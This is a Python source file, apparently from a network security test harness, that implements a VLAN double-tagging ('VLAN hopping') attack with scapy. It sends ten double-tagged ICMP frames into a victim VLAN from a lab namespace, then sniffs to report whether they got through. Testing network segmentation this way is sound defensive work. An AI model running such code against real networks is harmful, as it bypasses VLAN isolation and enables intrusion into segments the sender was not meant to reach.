from attacks.attack import Attack
from lib.connectivity import get_async_sniffer
import scapy.all as scapy
import netns
import ipaddress


class VlanHopping(Attack):
    def setup(self) -> None:
        self.sniff = get_async_sniffer(self.interfaces, 3, 'icmp')
        self.sniff.start()

    def attack(self) -> None:
        with netns.NetNS(nsname='host1'):
            scapy.conf.ifaces.reload()
            scapy.conf.route.resync()
            packet = (scapy.Ether(src=self.ethersrc, dst=self.etherdst)
                     / scapy.Dot1Q(vlan=self.config.get('native_vlan'))
                     / scapy.Dot1Q(vlan=self.config.get('victim_vlan'))
                     / scapy.IP(dst=self.config.get('victim_ip'))
                     / scapy.ICMP())
            packet_list = []
            for i in range(10):
                packet_list.append(packet)
            scapy.sendp(packet_list, inter=0.5)

    def result(self) -> bool:
        self.sniff.stop()
        for result in self.sniff.results.res:
            if result.dst == self.etherdst \
                and result.src == self.ethersrc \
                and result.type == 2048:
                return True

        return False

    def run(self):
        self.ethersrc = self.interfaces[1].mac
        self.etherdst = self.interfaces[3].mac
        self.setup()
        self.attack()
        return self.result()
